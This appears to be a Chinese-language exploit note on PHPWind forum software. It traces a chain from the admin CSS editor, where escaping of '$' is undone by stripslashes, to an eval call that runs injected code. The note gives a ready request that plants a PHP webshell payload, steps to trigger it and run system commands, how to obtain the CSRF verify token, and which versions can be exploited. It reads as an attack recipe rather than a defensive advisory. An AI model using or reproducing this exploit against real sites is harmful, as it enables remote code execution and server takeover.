## 判据（可跨站复用）

PHPWind 后台「风格模板」→ CSS 编辑 → `updatecache_sy()` 的 eval 链：

### 写入侧：admin/setstyles.php 的 editcss 分支
```php
} elseif ($_POST['action'] == 'editcss') {
	InitGP(array('sid'),'P');
	InitGP(array('style_css'),'P',0);          // 第三参数 0 = 不做 Char_cv ⇒ 内容零转义
	$basename .= "&action=edit&sid=$sid";
	include_once Pcv(D_P."data/style/$sid.php");   // 取得 $tplpath
	if (!pwWritable(D_P."data/style/{$tplpath}_css.htm")) { adminmsg('style_777'); }
	$cssadd    = readover(D_P."data/style/{$tplpath}_css.htm");
	$cssadd    = explode('<!--css-->',$cssadd);
	$style_css = str_replace('EOT','',$style_css);
	$style_css = str_replace("$","\$",$cssadd[0].'<!--css-->'.$style_css.'<!--css-->'.$cssadd[2]); // ①
	$style_css = stripslashes($style_css);   // ★ ② 把 ① 加的 \ 又去掉 ⇒ 防护净效果为零
	writeover(D_P."data/style/{$tplpath}_css.htm",$style_css);
	updatecache_sy($sid);
	adminmsg('operate_success');
}
```
**★ 核心判据：只要 `str_replace("$","\$")` 后面跟着 `stripslashes()`，`$` 就被完整还原，双引号串的 `${expr}` 插值可用。** 实测：`${system(id)}` → `\${system(id)}` → `${system(id)}`（原样落盘）。

### 执行侧：admin/cache.php 的 updatecache_sy()
```php
$style_css = explode('<!--css-->',readover(D_P."data/style/{$tplpath}_css.htm"));
$style_css = addslashes(str_replace(array('<style type="text/css">','</style>'),'',$style_css[1]));
eval("\$style_css = \"$style_css\";");     // ★ addslashes 不转义 $ { } ⇒ ${expr} 被求值
```
第二处（`if (empty($name))` 分支）会**遍历 include `data/style/` 下每个 .php**（落点），并对每个风格的 `_css.htm` 再跑一次同样的 eval。

### 触发配方
```
POST /bbs/example.com?adminjob=setstyles&verify=<页面内 verify>
Referer: <同域后台页>
Content-Type: application/x-www-form-urlencoded

action=editcss&sid=wind&style_css=<!--css-->${@eval($_POST[1])}<!--css-->
# payload 必须包在 <!--css--> 之间（数据源用 explode('<!--css-->') 取 [1] 段）
# 触发 eval：POST action=setcss&showcss=1（无参 updatecache_sy），或后台刷新缓存
# 带参执行：POST 1=system('id');
```
`verify` 由 `PostCheck()` 校验：`substr(md5($source.$admin_name.$admin_gid.$db_hash),0,8)`，其中 `$source` = 所有 GET 参数（排除 verify/nowtime）的 `key.value` 顺序拼接 —— **直接从页面 form 的 action 里取现成的 verify 即可**（它对应「GET 只有 adminjob=setstyles」这一种形态）。

### 版本状态（关键）
- **7.5 SP3 / 8.x：`editcss` 的 PHP 分支被 `/* */` 注释**（7.5 SP3 在 L136-155）⇒ 该版本不可用
- 7.5 SP3 的**模板**里 editcss 表单未注释，但 7.3.2 目标的模板里**被 HTML 注释**（`ex-setstyles-edit.html` L455→L712）
- **7.3.2 的 PHP 分支死活需实测判定**：`POST action=editcss&...` → **0 字节 = 已注释**；**「操作成功」= 活着**
- 前置闸门：`$rightset['setstyles']==1`（`example.com:57-60` 的 `adminRightCheck`，失败抛 `undefine_action`「您没有权限」）